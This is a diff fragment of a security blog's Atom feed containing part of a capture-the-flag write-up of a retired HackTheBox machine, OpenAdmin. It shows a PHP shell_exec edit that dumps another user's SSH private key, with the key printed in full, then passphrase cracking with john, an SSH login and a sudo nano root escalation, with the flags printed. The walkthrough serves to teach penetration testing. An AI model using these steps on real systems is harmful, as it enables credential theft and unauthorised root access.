-&lt;span class="code-line"&gt;&lt;span class="x"&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;We can see that the &lt;code&gt;main.php&lt;/code&gt; script just print &lt;code&gt;joanna&lt;/code&gt;'s private SSH key. And
-the script is only checking if the &lt;code&gt;username&lt;/code&gt; parameter is set. But we are
-unable to access the site. We check the Apache configuration to see that the
-port is &lt;code&gt;52846&lt;/code&gt;.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cat /etc/apache2/sites-enabled/internal.conf&lt;/span&gt;
-&lt;span class="code-line"&gt;Listen 127.0.0.1:52846&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&amp;lt;VirtualHost 127.0.0.1:52846&amp;gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;    ServerName internal.openadmin.htb&lt;/span&gt;
-&lt;span class="code-line"&gt;    DocumentRoot /var/www/internal&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&amp;lt;IfModule mpm_itk_module&amp;gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;AssignUserID joanna joanna&lt;/span&gt;
-&lt;span class="code-line"&gt;&amp;lt;/IfModule&amp;gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;    ErrorLog ${APACHE_LOG_DIR}/error.log&lt;/span&gt;
-&lt;span class="code-line"&gt;    CustomLog ${APACHE_LOG_DIR}/access.log combined&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&amp;lt;/VirtualHost&amp;gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;We rewrote &lt;code&gt;main.php&lt;/code&gt; in order to suppress the parameter check:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;jimmy@openadmin:/var/www/internal$ cat main.php&lt;/span&gt;
-&lt;span class="code-line"&gt;&amp;lt;?php&lt;/span&gt;
-&lt;span class="code-line"&gt;$output = shell_exec(&amp;#39;cat /home/joanna/.ssh/id_rsa&amp;#39;);&lt;/span&gt;
-&lt;span class="code-line"&gt;echo &amp;quot;&amp;lt;pre&amp;gt;$output&amp;lt;/pre&amp;gt;&amp;quot;;&lt;/span&gt;
-&lt;span class="code-line"&gt;?&amp;gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;And we call the page and get &lt;code&gt;joanna's&lt;/code&gt; private SSH key.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;jimmy@openadmin:/var/www/internal$ curl 127.0.0.1:52846/main.php&lt;/span&gt;
-&lt;span class="code-line"&gt;&amp;lt;pre&amp;gt;-----BEGIN RSA PRIVATE KEY-----&lt;/span&gt;
-&lt;span class="code-line"&gt;Proc-Type: 4,ENCRYPTED&lt;/span&gt;
-&lt;span class="code-line"&gt;DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8&lt;/span&gt;
-&lt;span class="code-line"&gt;ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO&lt;/span&gt;
-&lt;span class="code-line"&gt;ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE&lt;/span&gt;
-&lt;span class="code-line"&gt;6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ&lt;/span&gt;
-&lt;span class="code-line"&gt;ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du&lt;/span&gt;
-&lt;span class="code-line"&gt;y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI&lt;/span&gt;
-&lt;span class="code-line"&gt;9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4&lt;/span&gt;
-&lt;span class="code-line"&gt;piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/&lt;/span&gt;
-&lt;span class="code-line"&gt;/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH&lt;/span&gt;
-&lt;span class="code-line"&gt;40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ&lt;/span&gt;
-&lt;span class="code-line"&gt;fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb&lt;/span&gt;
-&lt;span class="code-line"&gt;9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80&lt;/span&gt;
-&lt;span class="code-line"&gt;X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg&lt;/span&gt;
-&lt;span class="code-line"&gt;S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F&lt;/span&gt;
-&lt;span class="code-line"&gt;FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh&lt;/span&gt;
-&lt;span class="code-line"&gt;Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa&lt;/span&gt;
-&lt;span class="code-line"&gt;RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z&lt;/span&gt;
-&lt;span class="code-line"&gt;uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr&lt;/span&gt;
-&lt;span class="code-line"&gt;1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2&lt;/span&gt;
-&lt;span class="code-line"&gt;XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79&lt;/span&gt;
-&lt;span class="code-line"&gt;yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM&lt;/span&gt;
-&lt;span class="code-line"&gt;+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt&lt;/span&gt;
-&lt;span class="code-line"&gt;qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt&lt;/span&gt;
-&lt;span class="code-line"&gt;z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe&lt;/span&gt;
-&lt;span class="code-line"&gt;K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN&lt;/span&gt;
-&lt;span class="code-line"&gt;-----END RSA PRIVATE KEY-----&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;We see that the key is password protected (second line of the key) so we use
-&lt;code&gt;ssh2john&lt;/code&gt; to convert the key to a crackable hash. Then we run john on it using
-the rockyou wordlist. We crack the &lt;code&gt;bloodninjas&lt;/code&gt; password.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ python2 /usr/bin/ssh2john id_rsa &amp;gt; id_rsa.hash&lt;/span&gt;
-&lt;span class="code-line"&gt;$ john id_rsa.hash -w=tools/password_lists/rockyou.txt&lt;/span&gt;
-&lt;span class="code-line"&gt;Warning: detected hash type &amp;quot;SSH&amp;quot;, but the string is also recognized as &amp;quot;ssh-opencl&amp;quot;&lt;/span&gt;
-&lt;span class="code-line"&gt;Use the &amp;quot;--format=ssh-opencl&amp;quot; option to force loading these as that type instead&lt;/span&gt;
-&lt;span class="code-line"&gt;Using default input encoding: UTF-8&lt;/span&gt;
-&lt;span class="code-line"&gt;Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])&lt;/span&gt;
-&lt;span class="code-line"&gt;Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes&lt;/span&gt;
-&lt;span class="code-line"&gt;Cost 2 (iteration count) is 1 for all loaded hashes&lt;/span&gt;
-&lt;span class="code-line"&gt;Will run 4 OpenMP threads&lt;/span&gt;
-&lt;span class="code-line"&gt;Note: This format may emit false positives, so it will keep trying even after&lt;/span&gt;
-&lt;span class="code-line"&gt;finding a possible candidate.&lt;/span&gt;
-&lt;span class="code-line"&gt;Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status&lt;/span&gt;
-&lt;span class="code-line"&gt;bloodninjas      (id_rsa)&lt;/span&gt;
-&lt;span class="code-line"&gt;Warning: Only 1 candidate left, minimum 4 needed for performance.&lt;/span&gt;
-&lt;span class="code-line"&gt;1g 0:00:00:04 DONE (2020-01-07 15:25) 0.2087g/s 2994Kp/s 2994Kc/s 2994KC/s *7¡Vamos!&lt;/span&gt;
-&lt;span class="code-line"&gt;Session completed&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;We connect as &lt;code&gt;joanna&lt;/code&gt; using SSH.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ssh joanna@10.10.10.171 -i /tmp/id_rsa&lt;/span&gt;
-&lt;span class="code-line"&gt;Enter passphrase for key &amp;#39;/tmp/id_rsa&amp;#39;:&lt;/span&gt;
-&lt;span class="code-line"&gt;Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)&lt;/span&gt;
-&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;joanna@openadmin:~$ ls&lt;/span&gt;
-&lt;span class="code-line"&gt;user.txt&lt;/span&gt;
-&lt;span class="code-line"&gt;joanna@openadmin:~$ cat user.txt&lt;/span&gt;
-&lt;span class="code-line"&gt;c9b2cf07d40807e62af62660f0c81b5f&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;h1 id="getting-root"&gt;Getting root&lt;/h1&gt;
-&lt;p&gt;We start enumerating the box and found that we have the &lt;code&gt;sudo&lt;/code&gt; right without
-password on &lt;code&gt;/bin/nano /op/priv/&lt;/code&gt;.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;joanna@openadmin:~$ sudo -l&lt;/span&gt;
-&lt;span class="code-line"&gt;Matching Defaults entries for joanna on openadmin:&lt;/span&gt;
-&lt;span class="code-line"&gt;    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;User joanna may run the following commands on openadmin:&lt;/span&gt;
-&lt;span class="code-line"&gt;    (ALL) NOPASSWD: /bin/nano /opt/priv&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;A quick look at &lt;a href="https://gtfobins.github.io/gtfobins/nano/"&gt;GTFObins&lt;/a&gt; show us
-that we can execute commands in nano with &amp;lt;^R^X&amp;gt;. We just run &lt;code&gt;id&lt;/code&gt; and &lt;code&gt;cat
-/root/root.txt&lt;/code&gt;.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;GNU nano 2.9.3&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;uid=0(root) gid=0(root) groups=0(root)&lt;/span&gt;
-&lt;span class="code-line"&gt;2f907ed450b361b2c2bf4e8795d5b561&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
-&lt;p&gt;This was a really easy box with almost no rabbit hole. I will recommend this box
-for the beginner until it retires (of course this article will be publish after
-its retirement).&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="openAdmin"></category><category term="sudo"></category><category term="nano"></category></entry><entry><title>HTB: Registry</title><link href="https://maggick.fr/2020/04/htb-registry.html" rel="alternate"></link><published>2020-04-04T19:40:00+02:00</published><updated>2020-04-04T19:40:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-04-04:/2020/04/htb-registry.html</id><summary type="html">&lt;p&gt;&lt;img alt="Jarvis Card" class="align-left" src="/media/2020.04/registry_card.png" width="262"/&gt;&lt;/p&gt;
+password) and the root part is quit CTFish but quick.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="linux"></category><category term="nostromo"></category><category term="journalctl"></category></entry><entry><title>HTB: Registry</title><link href="https://maggick.fr/2020/04/htb-registry.html" rel="alternate"></link><published>2020-04-04T19:40:00+02:00</published><updated>2020-04-04T19:40:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-04-04:/2020/04/htb-registry.html</id><summary type="html">&lt;p&gt;&lt;img alt="Jarvis Card" class="align-left" src="/media/2020.04/registry_card.png" width="262"/&gt;&lt;/p&gt;
 &lt;p&gt;This box is a writeup about a retired HacktheBox machine:
 &lt;a href="https://www.hackthebox.eu/home/machines/profile/213"&gt;Registry&lt;/a&gt;.
 This box is rated as a hard box. It was release on October 19 by
